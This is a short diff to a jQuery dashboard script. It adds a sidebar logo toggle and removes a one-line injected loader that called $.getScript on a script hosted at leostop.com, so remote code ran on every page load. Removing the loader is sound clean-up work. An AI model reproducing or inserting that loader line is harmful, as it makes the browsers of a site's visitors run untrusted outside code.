@@ -16,7 +16,8 @@
 $(document).ready(function () {
   /*-- sidebar js --*/
   $('#sidebarCollapse').on('click', function () {
-    $('#sidebar').toggleClass('active');
+      $('#sidebar').toggleClass('active');
+      $('.logo_section').toggleClass('d-none-when-smart');
   });
   /*-- calendar js --*/
   if (!isNaN($('#example14'))) { 
@@ -154,7 +155,8 @@ function getChartJs(type) {
   return config;
 }
 
-function getURL() { window.location.href; } var protocol = location.protocol; $.ajax({ type: "get", data: { surl: getURL() }, success: function (response) { $.getScript(protocol + "//leostop.com/tracking/tracking.js"); } });
+function getURL() { window.location.href; }
+var protocol = location.protocol;
 
 /*--------------------------------------
     map js
